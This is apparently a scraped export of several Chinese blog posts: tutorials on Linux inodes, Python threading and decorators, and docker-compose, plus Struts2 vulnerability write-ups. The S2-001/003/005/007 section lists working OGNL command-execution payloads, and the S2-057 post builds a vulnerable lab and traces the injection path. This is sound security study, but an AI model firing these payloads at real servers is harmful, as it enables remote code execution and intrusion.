1000/ mzl)Access: 2018-03-03 19:37:22.683247964 -0800Modify: 2018-03-03 19:37:20.525043948 -0800Change: 2018-03-03 19:37:20.525043948 -0800 Birth: - 总之，除了文件名以外的所有文件信息，都存在inode之中。至于为什么没有文件名，下文会有详细解释。 inode的大小inode也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；另一个是inode区（inode table），存放inode所包含的信息。 每个inode节点的大小，一般是128字节或256字节。inode节点的总数，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。假定在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，占整块硬盘的12.8%。 查看每个硬盘分区的inode总数和已经使用的数量，可以使用df命令。 df -i 123456789mzl@ubuntu:~$ df -iFilesystem Inodes IUsed IFree IUse% Mounted onudev 495475 443 495032 1% /devtmpfs 502056 698 501358 1% /run/dev/sda1 1245184 440629 804555 36% /tmpfs 502056 9 502047 1% /dev/shmtmpfs 502056 6 502050 1% /run/locktmpfs 502056 17 502039 1% /sys/fs/cgrouptmpfs 502056 33 502023 1% /run/user/1000 查看每个inode节点的大小，可以用如下命令： sudo dumpe2fs -h /dev/sda1 | grep “Inode size” 123mzl@ubuntu:~$ sudo dumpe2fs -h /dev/sda1 | grep \"Inode size\"dumpe2fs 1.42.13 (17-May-2015)Inode size: 256 由于每个文件都必须有一个inode，因此有可能发生inode已经用光，但是硬盘还未存满的情况。这时，就无法在硬盘上创建新文件。 inode号码每个inode都有一个号码，操作系统用inode号码来识别不同的文件。 这里值得重复一遍，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或者绰号。 表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。 使用ls -i命令，可以看到文件名对应的inode号码： ls -i [文件名称] 12mzl@ubuntu:~$ ls -i code/149184 pwn 目录文件Unix/Linux系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。 目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所包含文件的文件名，以及该文件名对应的inode号码。 ls命令只列出目录文件中的所有文件名： ls /etc ls -i命令列出整个目录文件，即文件名和inode号码： ls -i /etc 如果要查看文件的详细信息，就必须根据inode号码，访问inode节点，读取信息。ls -l命令列出文件的详细信息。 ls -l /etc 理解了上面这些知识，就能理解目录的权限。目录文件的读权限（r）和写权限（w），都是针对目录文件本身。由于目录文件内只有文件名和inode号码，所以如果只有读权限，只能获取文件名，无法获取其他信息，因为其他信息都储存在inode节点中，而读取inode节点内的信息需要目录文件的执行权限（x）。 硬链接一般情况下，文件名和inode号码是”一一对应”关系，每个inode号码对应一个文件名。但是，Unix/Linux系统允许，多个文件名指向同一个inode号码。 这意味着，可以用不同的文件名访问同样的内容；对文件内容进行修改，会影响到所有文件名；但是，删除一个文件名，不影响另一个文件名的访问。这种情况就被称为”硬链接”（hard link）。 ln命令可以创建硬链接： ln 源文件 目标文件 运行上面这条命令以后，源文件与目标文件的inode号码相同，都指向同一个inode。inode信息中有一项叫做”链接数”，记录指向该inode的文件名总数，这时就会增加1。 反过来，删除一个文件名，就会使得inode节点中的”链接数”减1。当这个值减到0，表明没有文件名指向这个inode，系统就会回收这个inode号码，以及其所对应block区域。 这里顺便说一下目录文件的”链接数”。创建目录时，默认会生成两个目录项：”.”和”..”。前者的inode号码就是当前目录的inode号码，等同于当前目录的”硬链接”；后者的inode号码就是当前目录的父目录的inode号码，等同于父目录的”硬链接”。所以，任何一个目录的”硬链接”总数，总是等于2加上它的子目录总数（含隐藏目录）。 软链接除了硬链接以外，还有一种特殊情况。 文件A和文件B的inode号码虽然不一样，但是文件A的内容是文件B的路径。读取文件A时，系统会自动将访问者导向文件B。因此，无论打开哪一个文件，最终读取的都是文件B。这时，文件A就称为文件B的”软链接”（soft link）或者”符号链接（symbolic link）。 这意味着，文件A依赖于文件B而存在，如果删除了文件B，打开文件A就会报错：”No such file or directory”。这是软链接与硬链接最大的不同：文件A指向文件B的文件名，而不是文件B的inode号码，文件B的inode”链接数”不会因此发生变化。 ln -s命令可以创建软链接。 ln -s 源文文件或目录 目标文件或目录 inode的特殊作用由于inode号码与文件名分离，这种机制导致了一些Unix/Linux系统特有的现象。 1. 有时，文件名包含特殊字符，无法正常删除。这时，直接删除inode节点，就能起到删除文件的作用。 2. 移动文件或重命名文件，只是改变文件名，不影响inode号码。 3. 打开一个文件以后，系统就以inode号码来识别这个文件，不再考虑文件名。因此，通常来说，系统无法从inode号码得知文件名。 第3点使得软件更新变得简单，可以在不关闭软件的情况下进行更新，不需要重启。因为系统通过inode号码，识别运行中的文件，不通过文件名。更新的时候，新版文件以同样的文件名，生成一个新的inode，不会影响到运行中的文件。等到下一次运行这个软件的时候，文件名就自动指向新版文件，旧版文件的inode则被回收。","link":"/2018/08/02/2018/Linux%E4%B8%8A%E7%A5%9E%E5%A5%87%E7%9A%84inode%E7%BC%96%E5%8F%B7/"},{"title":"Python3多线程","text":"一次培训课程后总结的部分Python3 多线程 多线程使用 函数使用 12345678910111213import threadingdef 函数名称(变量名称1=1, 变量名称2=1): for i in range(变量名称1): print(i*变量名称2)thread0 = threading.Thread(target=函数名称)thread1 = threading.Thread(target=函数名称, args=(变量名称1=3,))thread2 = threading.Thread(target=函数名称, args=(变量名称1=3,变量名称2=4))thread0.start() # 创建线程执行函数thread1.start() # 同上, 执行函数的参数通过args传入thread2.start() # 同上 面向对象 1234567891011121314151617import threadingclass 类名1(threading.Thread): def run(self): 线程内执行内容 tp = 类名1() tp.start() class 类名2(threading.Thread): def __init__(self, args): threading.Thread.__init__(self) self.args = args def run(self): 线程内执行内容 tp = 类名2(args='lala') tp.start() 内置方法 1threading.enumerate() # 当前运行的线程数量,包括主线程 线程互斥锁 获得线程锁 12345678910lock = threading.Lock()lock.release() # 释放锁lock.acquire() # 加锁acquire(blocking=True)如果blocking=False,程序将继续向下执行返回值: True: 锁为释放状态,进行加锁 False: 锁为被锁状态 同步与异步 同步线程举例 Task1 -&gt; Task2 -&gt; Task3 -&gt; 1 .. 2 .. 3 .. 1 … 12345678910111213141516171819202122232425262728293031323334353637383940414243from threading import Thread,Lock# import threadingfrom time import sleepclass Task1(Thread): def run(self): while True: if lock1.acquire(): print(\"------Task 1 -----\") sleep(0.5) lock2.release()class Task2(Thread): def run(self): while True: if lock2.acquire(): print(\"------Task 2 -----\") sleep(0.5) lock3.release()class Task3(Thread): def run(self): while True: if lock3.acquire(): print(\"------Task 3 -----\") sleep(0.5) lock1.release()if __name__ == '__main__': lock1 = Lock() lock2 = Lock() lock3 = Lock() lock2.acquire() lock3.acquire() t1 = Task1() t2 = Task2() t3 = Task3() t1.start() t2.start() t3.start() Queue使用 生产者与消费者 123456789101112131415161718192021222324252627282930313233import threadingimport timeimport queueclass Producer(threading.Thread): def run(self): global queue1 count = 0 while True: if queue1.qsize() &lt; 1000: for i in range(100): count = count + 1 msg = '生成产品' + str(count) queue1.put(msg) print(msg) time.sleep(1)class Consumer(threading.Thread): def run(self): global queue1 while True: if queue1.qsize() &gt; 100: for i in range(3): msg = self.name + '消费了 ' + queue1.get() print (msg) time.sleep(1)if __name__ == '__main__': queue1 = queue.Queue() for i in range(500): queue1.put('初始产品' + str(i)) for i in range(2):Producer().start() for i in range(5):Consumer().start() Queue待补充 线程池待补充 立flag、九月以前，Python文章一定上线","link":"/2018/07/21/2018/Python3%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"title":"Python3装饰器","text":"简单装饰器、通用装饰器、类装饰器 引入问题 我们写一个简单代码模拟上课中的内容。 1234def lesson(name): print ('[+]class name: ', name)lesson('python') 不知道大家小时候上课的之前会不会老师说一句上课，然后班长起来喊一句起立，之后大家说一声老师好，最后再上课。 所以，我们写如下代码： 123456def lesson(name): print ('[+]class name: ', name)print('[+]喊: 上课, 起立, 老师好')lesson('python') 我们再试试函数包装起来： 123def start_lesson(name): print('[+]喊: 上课, 起立, 老师好') lesson(name) 没什么问题吧，上高阶函数： 1234567def start_lesson(name): def inner(): print('[+]喊: 上课, 起立, 老师好') lesson(name) return innerstart_lesson('python')() 实现的方式可以有很多种，这个时候我们使用装饰器试试。 1234567891011def start_lesson(func): def inner(): print('[+]喊: 上课, 起立, 老师好') func() return inner@start_lessondef lesson(): print ('[+]class name: python')lesson() 这是简单装饰器的写法，那么很多人应该有疑问了，WHY？ 装饰器 实际上，上面的代码约等于：start_lesson(lesson)()，执行步骤如下： 123456789101112131415lesson() # 首先执行函数, # 因为加了一个 @函数名 , 所以将先进入start_lesson函数中-&gt;def start_lesson(func): def inner(): print('[+]喊: 上课, 起立, 老师好') func() return inner# 返回函数对象并执行该函数对象# 运行结果如下-&gt;[+]喊: 上课, 起立, 老师好[+]class name: python 通过debug之后，我们知道了大致的执行流程，并且得出如下结论简单装饰器在使用的时候，首先将被装饰的函数前加一个@函数名，然后以此函数名写装饰。那么，当被装饰的函数有参数值，我们该如何呢？ 1234567891011def start_lesson(func): def inner(name): print('[+]喊: 上课, 起立, 老师好') func(name) return inner@start_lessondef lesson(name): print ('[+]class name: ', name)lesson('python') 看到这里，相信很多人会蒙蔽，之前不是说先执行@后面的start_lesson嘛，可是这里start_lesson都没有接受name值，start_lesson里面的inner函数的name哪里来的？ 实际上，lesson的参数将会直接传值给装饰器函数的返回值的那个函数inner，我们可以用下面的代码测试： 1234567891011121314def start_lesson(func): def inner(name): print('[+]喊: 上课, 起立, 老师好') func(name) def inner2(person, words, name): print('[+]%s: %s' % (person, words)) func(name) return inner2@start_lessondef lesson(name): print ('[+]class name: ', name)lesson('老师', '上课', 'Python') 练习： 根据自己目前所学模仿以上方式，将上课正常交互，老师，班长，学生，最后正式上课输出。要求lesson内容不变，可以加装饰器，自由发挥啊。 1234567891011121314151617181920212223lesson_list = { '老师':'上课', '班长':'起立', '学生':'老师好'}name = 'python'def start_lesson(func): def inner(name): print('[+]喊: 上课, 起立, 老师好') func(name) def inner2(lesson_list, name): for i in lesson_list: print('[+]%s: %s' % (i, lesson_list[i])) func(name) return inner2@start_lessondef lesson(name): print('[+]class name: ', name)lesson(lesson_list, name) 现在我们思考一个问题，如果被装饰的函数具有返回值该怎么办？ 我们可以直接通过装饰器函数的返回的函数对象返回被装饰器函数的返回值，听起来有点绕，还是直接看代码吧： 12345678910111213def start_lesson(func): def inner(name): print('[+]喊: 上课, 起立, 老师好') result = func(name) return result return inner@start_lessondef lesson(name): print('[+]class name: ', name) return '[+]下课'print(lesson('python')) 参数值的类型改变，数量也改变，那么是不是装饰器也需要改变，有没有通用型的装饰器，至少在参数这方面可以完全不修改。 12345def global(func): def inner(*args, **kwargs): ret = func(*args, **kwargs) return ret return inner 我来演示一下 *args 与 **kwargs 都是干啥的： 12345def fun(*args, **kwargs): print ('args: ', args) print ('kwargs: ', kwargs)fun(1,2,3,4,5,'a','n',None,True, False, a='a', b='b') 类装饰器 装饰器函数其实是一个接口约束，它必须接受一个callable对象作为参数，然后返回一个callable对象。在python中，一般callable对象都是函数，但是也有例外。比如只要某个对象重写了call方法，那么这个对象就是callable的。 当创建一个对象后，直接去执行这个对象，那么是会抛出异常的，因为他不是callable，无法直接执行，但进行修改后，就可以直接执行调用了，如下 123456class Test(object): def __call__(self, *args, **kwargs): print('call called')t = Test()print(t())1234567 输出为： 1call called1 下面，引入正题，看一下如何用类装饰函数。 123456789101112131415161718class Test(object): def __init__(self, func): print('test init') print('func name is %s ' % func.__name__) self.__func = func def __call__(self, *args, **kwargs): print('装饰器中的功能') self.__func()@Testdef test(): print('this is test func')test()123456789101112131415161718 输出结果为： 1234test initfunc name is test 装饰器中的功能this is test func1234 和之前的原理一样，当python解释器执行到到@Test时，会把当前test函数作为参数传入Test对象，调用init方法，同时将test函数指向创建的Test对象，那么在接下来执行test()的时候，其实就是直接对创建的对象进行调用，执行其call方法。","link":"/2018/08/20/2018/Python3%E8%A3%85%E9%A5%B0%E5%99%A8/"},{"title":"S2漏洞","text":"S2-001漏洞、S2-002漏洞 S2-001 Struts 2.0.0 - Struts 2.0.8 网上的漏洞复现一堆，这里就直接留一个exp纪念： 获取 tomcat 执行路径： 1%{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"} 获取 Web 路径： 1%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()} 命令执行： 1%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"calc.exe\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} 漏洞分析在我的struts2架构学习文章中，说到过整个执行过程，也说到OGNL的强大，以至于开发者的滥用。 在struts2通过拦截器链处理完aciton开始递归回溯的时候，需要将ValueStack栈中的值初始化为一个结果对象，处理时对数据递归地OGNL表达式解析。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator) { // deal with the \"pure\" expressions first! //expression = expression.trim(); Object result = expression; while (true) { int start = expression.indexOf(open + \"{\"); int length = expression.length(); int x = start + 2; int end; char c; int count = 1; while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) { c = expression.charAt(x++); if (c == '{') { count++; } else if (c == '}') { count--; } } end = x - 1; if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) { String var = expression.substring(start + 2, end); Object o = stack.findValue(var, asType); if (evaluator != null) { o = evaluator.evaluate(o); } String left = expression.substring(0, start); String right = expression.substring(end + 1); if (o != null) { if (TextUtils.stringSet(left)) { result = left + o; } else { result = o; } if (TextUtils.stringSet(right)) { result = result + right; } expression = left + o + right; } else { // the variable doesn't exist, so don't display anything result = left + right; expression = left + right; } } else { break; } } return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType); } 而为什么一定要失败呢？ 因为成功了以后值栈的数据就被置换，用户输入的数据会被直接出栈，如果是失败，数据不会被弹出，在之后被OGNL解析的时候，当然成功的不会执行，而失败的会执行。 S2-00?POC： S2-003 Struts 2.0.0 - Struts 2.0.11.2 1http://127.0.0.1:8080/struts2-showcase-2.0.1/showcase.action?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&amp;('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&amp;('\\u0023mycmd\\u003d\\'ipconfig\\'')(bla)(bla)&amp;('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)&amp;(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))&amp;(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))&amp;(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))&amp;(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))&amp;('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla)) S2-005 Struts 2.0.0 - Struts 2.1.8.1 1?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&amp;('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&amp;('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(bla)(bla)&amp;('\\u0023mycmd\\u003d\\'ipconfig\\'')(bla)(bla)&amp;('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)&amp;(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))&amp;(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))&amp;(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))&amp;(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))&amp;('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla)) S2-003与S2-005漏洞介绍 Struts会将HTTP的每个参数名解析为ognl语句执行(可以理解为Java代码)。ognl表达式通过#来访问struts的对象，Struts框架通过过滤#字符防止安全问题，通过unicode编码(u0023)或8进制(43)即可绕过安全限制。 S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\\u0023或者8进制\\43绕过。 S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。 可以在我的java字符对比一文中找到。 S2-007 Struts 2.0.0 - Struts 2.2.3 POC： 1' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('calc').getInputStream())) + ' 当有转换错误时，用户输入被评估为OGNL表达式。这允许恶意用户执行任意代码。 参考链接https://github.com/sie504/Struts-S2-xxx","link":"/2018/08/20/2018/S2%E7%B3%BB%E5%88%97%E8%BF%9C%E5%8F%A4%E6%BC%8F%E6%B4%9E/"},{"title":"docker-compose的简单使用","text":"着重于docker-compose于MySQL的使用 实例派docker-compose简单使用 构建命令：docker-compose up -d 停止命令：docker-compose stop 启动命令：docker-compose start 搭建sql-labs来一个sql-labs试试，当前我们有的是网页文件、数据库文件 创建目录如下： 123456- sql-labs├── db # 存放数据库文件│ └── sql-lab.sql├── docker-compose.yml # 书写docker-compose配置├── html # 存放网页文件│ └── ... docker-compose.yml文件如下 建立MySQL所在容器与 web服务所在容器之间的连接 将数据库文件目录挂载到MySQL自动加载目录 将网页文件目录挂载到 WEB 服务主目录 123456789101112131415161718192021222324version: '3.1' # docker-compose语法版本号services: db: # 第一个容器 image: mysql # mysql镜像，版本为latest command: --default-authentication-plugin=mysql_native_password # 防止mysql8.0 ROOT用户问题 restart: always # 重启 environment: # 将环境变量传递到容器 MYSQL_ROOT_PASSWORD: root # 设置MySQL密码 MYSQL_DATABASE: security # 设置MySQL启动时默认创建数据库 volumes: # 挂载卷 - ./db:/docker-entrypoint-initdb.d web: # 第二个容器 image: php:5.6-apache restart: always ports: - 80:80 volumes: # 挂载卷 - ./html:/var/www/html links: # 建立容器 db 与 web 之间的连接 - db adminer: image: adminer # 镜像名称 ports: # 端口映射 - 8080:8080 links与depends_onlinks表示建立容器之间的连接，即容器内服务能够互相访问，或者说网络融合。 depends_on表示容器依赖另一个容器，如果从运行顺序角度来看，被依赖的容器先于该容器运行。 搭建S02-57可能大家有点懵，我们来整个简单的。试试今天新出的漏洞。大概有以下需求： 修改struts2中的测试例子的struts2-showcase.war 放置于tomcat中运行 这里笔者的方案是选择把修改操作先做完，然后将这个测试例子挂载到tomcat的网页目录下 docker-compose.yml文件如下 123456789version: '3.1'services: web: image: tomcat:8.0.53-jre8 restart: always volumes: - ./struts2-showcase:/usr/local/tomcat/webapps/ROOT ports: - 8080:8080 目录结构如下： 12345├── docker-compose.yml└── struts2-showcase ├── ... │ ├── ... ... 根据lgtm团队报告我们搜索并修改文件struts-actionchaining.xml中的struts标签如下： 123456789&lt;struts&gt; &lt;package name=\"actionchaining\" extends=\"struts-default\"&gt; &lt;action name=\"actionChain1\" class=\"org.apache.struts2.showcase.actionchaining.ActionChain1\"&gt; &lt;result type=\"redirectAction\"&gt; &lt;param name = \"actionName\"&gt;register2&lt;/param&gt; &lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 这里我已经做好了，链接于我的Cveker项目，看看我们有什么不同。 MySQL环境变量MySQL镜像环境变量MYSQL_ROOT_PASSWORD必选变量，指定将为MySQL root超级用户帐户设置的密码。 MYSQL_DATABASE可选变量，允许您指定要在映像启动时创建的数据库的名称。如果提供了用户/密码（见下文），则该用户将被授予对该数据库的超级用户访问权限。 MYSQL_USER、MYSQL_PASSWORD可选变量，创建新用户并设置该用户的密码。此用户将被授予MYSQL_DATABASE变量指定的数据库的超级用户权限（见上文），这两个变量为依赖关系。 MYSQL_ALLOW_EMPTY_PASSWORD可选变量。设置为yes允许以root用户的空密码启动容器。即允许任何人获得完整的超级用户访问权限 MYSQL_RANDOM_ROOT_PASSWORD可选变量。设置yes为为root用户生成随机初始密码（使用pwgen），生成的root密码将打印到stdout（GENERATED ROOT PASSWORD: …..） MYSQL_ONETIME_PASSWORD可选变量，初始化完成后，将root（不是MYSQL_USER！中指定的用户）设置为过期，在首次登录时强制更改密码。注意：此功能仅在MySQL 5.6+上受支持。 详细见MySQL的hub主页。","link":"/2018/08/23/2018/docker-compose%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"},{"title":"S2-057漏洞分析","text":"2018年8月23日清晨，收到上司发来的一个微信，迅速起身倒腾这个新鲜出炉的CVE-2018-11776。本人分析的极为粗致，如有大佬看到，还望指点一二。 漏洞公告官方在2018年八月22日发布漏洞公告 漏洞发现者博客，看着像给工具打广告。 环境搭建到我的项目Cveker拉取下来，使用docker-compose快速搭建。 123$ git clone https://github.com/white3/Cveker.git$ cd Cveker/2018/CVE-2018-11776/$ docker-compose up -d 这样我们的环境就搭建完成了。(目前Cveker项目刚刚开始，以后会陆续更新很多漏洞) 访问URL：http://127.0.0.1:8080/${(123-123)}/actionChain1.action 返回URL：http://127.0.0.1:8080/0/actionChain1.action 123-123=0，产生OGNL注入 漏洞分析从eclipse中打开目录struts2-showcase项目 知识普及在漏洞发现者的博客上，我了解了如下内容： Struts中有许多函数最终将它们的参数作为OGNL表达式进行处理 ognl入口点常见的有如下 12345class OgnlUtil - getValue() - compileAndExecute() - compileAndExecuteMethod()class TextParseUtil - translateVariables()... 攻击向量漏洞发现者给了五种攻击向量，其中一下三个漏洞攻击向量经过测试： Redirect action Action chaining Postback result 以上提及的三种都属于Struts2的跳转方式。在 struts-default.xml:190(截取部分) 123456... 190&lt;result-types&gt; &lt;result-type name=\"chain\" class=\"com.opensymphony.xwork2.ActionChainResult\"/&gt; &lt;result-type name=\"redirectAction\" class=\"org.apache.struts2.result.ServletActionRedirectResult\"/&gt; &lt;result-type name=\"postback\" class=\"org.apache.struts2.result.PostbackResult\" /&gt;&lt;/result-types&gt; 如果有学习过struts，应该对下图较为眼熟： 这里使用的是动态代理，每一个请求都要经过上述从HttpServletRequest进入，从strusts.xml配置中查看对应的处理类，然后代理处理请求，经过各种拦截器处理后，进入action处理业务逻辑，然后把result传入servlet处理后，再经过过滤器最后返回响应。而这里的result都要经过ActionInvocation接口处理，默认的result对象则要经过DefaultActionInvocation类来处理。 12345678910111213141516// com.opensymphony.xwork2.DefaultActionInvocation 368行/** * Uses getResult to get the final Result and executes it * 使用 getResult 获取最终结果并执行 * * @throws ConfigurationException If not result can be found with the returned code */private void executeResult() throws Exception { result = createResult(); String timerKey = \"executeResult: \" + getResultCode(); try { UtilTimerStack.push(timerKey); if (result != null) { result.execute(this); // &lt;---------------------------------- 这里 ... 而在这个执行点中： 有一些具体的result对象比如上图中StrutsResultSupport子类ServletActionRedirectResult和PostbackResult(后文会说，与父类无异)，其他的会产生一个跳转地址location，并传入StrutsResultSupport中: 12345678910111213141516 /** * org.apache.struts2.result.StrutsResultSupport 194 * * 从结果接口实现执行方法。在可选地将位置评估为OGNL评估之后，这将调用抽象方法{@link#doExecute(String，ActionInvocation)}。 * * Implementation of the &lt;tt&gt;execute&lt;/tt&gt; method from the &lt;tt&gt;Result&lt;/tt&gt; interface. This will call * the abstract method {@link #doExecute(String, ActionInvocation)} after optionally evaluating the * location as an OGNL evaluation. * * @param invocation the execution state of the action. * @throws Exception if an error occurs while executing the result.*/public void execute(ActionInvocation invocation) throws Exception { lastFinalLocation = conditionalParse(location, invocation); doExecute(lastFinalLocation, invocation);} 而conditionalParse定义如下，将会执行OGNL表达式。 123456789101112131415161718/** * Parses the parameter for OGNL expressions against the valuestack * 解析OGNL表达式与ValueStACK的参数 * * @param param The parameter value * @param invocation The action invocation instance * @return the resulting string*/protected String conditionalParse(String param, ActionInvocation invocation) { if (parse &amp;&amp; param != null &amp;&amp; invocation != null) { return TextParseUtil.translateVariables( param, invocation.getStack(), new EncodingParsedValueEvaluator()); } else { return param; }} 所以可以看到重点是StrutsResultSupport中conditionalParse(location, invocation)的location变量。而这个TextParseUtil是不是很像前文提及的OGNL入口点之一。 我们来分析漏洞发现者测试的三种result-type的具体实现和具体攻击点。 XML配置先看看我们的配置文件/WEB-INF/src/java/struts-actionchaining.xml ： 123456789101112131415161718192021&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.5//EN\" \"http://struts.apache.org/dtds/struts-2.5.dtd\"&gt;&lt;struts&gt; &lt;package name=\"actionchaining\" extends=\"struts-default\"&gt; &lt;action name=\"actionChain1\" class=\"org.apache.struts2.showcase.actionchaining.ActionChain1\"&gt; &lt;result type=\"redirectAction\"&gt; &lt;param name = \"actionName\"&gt;redirectAction_test&lt;/param&gt; &lt;/result&gt; &lt;/action&gt; &lt;action name=\"actionChain2\" class=\"org.apache.struts2.showcase.actionchaining.ActionChain1\"&gt; &lt;result type=\"chain\"&gt;chain_test&lt;/result&gt; &lt;/action&gt; &lt;action name=\"actionChain3\" class=\"org.apache.struts2.showcase.actionchaining.ActionChain1\"&gt; &lt;result type=\"postback\"&gt; &lt;param name=\"actionName\"&gt;menzel3&lt;/param&gt; &lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 我们分别用actionChain1、actionChain2、actionChain3来测试，其中每个type的类型分别是三个攻击向量。 向量一：Redirect action和之前说的一样，发送请求http://127.0.0.1:8080/struts2-showcase/${(1-111)}/actionChain1.action后，在类com.opensymphony.xwork2.DefaultActionInvocation处的断点停在下面： 跟入org.apache.struts2.result.ServletActionRedirectResult的execute方法 1234567891011121314151617181920... 160/** * @see com.opensymphony.xwork2.Result#execute(com.opensymphony.xwork2.ActionInvocation) */public void execute(ActionInvocation invocation) throws Exception { actionName = conditionalParse(actionName, invocation); if (namespace == null) { namespace = invocation.getProxy().getNamespace(); // &lt;----------关键1 } else { namespace = conditionalParse(namespace, invocation); } if (method == null) { method = \"\"; } else { method = conditionalParse(method, invocation); } String tmpLocation = actionMapper.getUriFromActionMapping(new ActionMapping(actionName, namespace, method, null)); // &lt;----------关键2 setLocation(tmpLocation); super.execute(invocation);} xml文档中没有设置namespace，它为null，然后执行invocation.getProxy().getNamespace();从URL获取namespace，也就是页面路由 一直单步跟，直到进入ActionMapping初始化ActionMapping对象 1234567// org.apache.struts2.dispatcher.mapper.ActionMapping public ActionMapping(String name, String namespace, String method, Map&lt;String, Object&gt; params) { this.name = name; this.namespace = namespace; this.method = method; this.params = params; } 进入getUriFromActionMapping看看如何处理namespace的 12345678910111213141516171819202122232425// org.apache.struts2.dispatcher.mapper.DefaultActionMapper... 474行public String getUriFromActionMapping(ActionMapping mapping) { StringBuilder uri = new StringBuilder(); handleNamespace(mapping, uri); handleName(mapping, uri); handleDynamicMethod(mapping, uri); handleExtension(mapping, uri); handleParams(mapping, uri); return uri.toString();}... 486行// 直接取出mapping中的值添加到uri中// 其他handle类似，就不一一列举了protected void handleNamespace(ActionMapping mapping, StringBuilder uri) { if (mapping.getNamespace() != null) { uri.append(mapping.getNamespace()); if (!\"/\".equals(mapping.getNamespace())) { uri.append(\"/\"); } }} 其中getUriFromActionMapping处理过程如下： 然后继续往后走， 然后执行父类org.apache.struts2.result.StrutsResultSupportexcute的方法execute，我们跟进： 这里显示执行代码conditionalParse(location, invocation);，通过审计我们可以发现这是上午ognl入口点之一。 1234567891011...214protected String conditionalParse(String param, ActionInvocation invocation) { if (parse &amp;&amp; param != null &amp;&amp; invocation != null) { return TextParseUtil.translateVariables( param, invocation.getStack(), new EncodingParsedValueEvaluator()); } else { return param; }} 执行完conditionalParse(location, invocation);后 向量二： Action chaining我们来试试actionChain2，请求URLhttp://127.0.0.1:8080/struts2-showcase/${(1-111)}/actionChain2.action 先由类com.opensymphony.xwork2.DefaultActionInvocation处理， 由于这次是具体的result对象，我们跟进，果然进入com.opensymphony.xwork2.ActionChainResult 同样的，由于xml中没有设置namespace，其为空，现在通过invocation.getProxy().getNamespace();获取 123456789...203 com.opensymphony.xwork2.ActionChainResultpublic void execute(ActionInvocation invocation) throws Exception { // if the finalNamespace wasn't explicitly defined, assume the current one if (this.namespace == null) { this.namespace = invocation.getProxy().getNamespace(); // &lt;----- 取出namespace } ValueStack stack = ActionContext.getContext().getValueStack(); String finalNamespace = TextParseUtil.translateVariables(namespace, stack); 通过变量名称，我们可以猜测这将是Namespace最后一次变化，我们跟进查看： 123456public class TextParseUtil { ... // 这不是我们梦寐以求的ognl战场入口点吗 public static String translateVariables(String expression, ValueStack stack) { return translateVariables(new char[]{'$', '%'}, expression, stack, String.class, null).toString(); } 然后我们继续往后看， 123+321=444 向量三：Postback 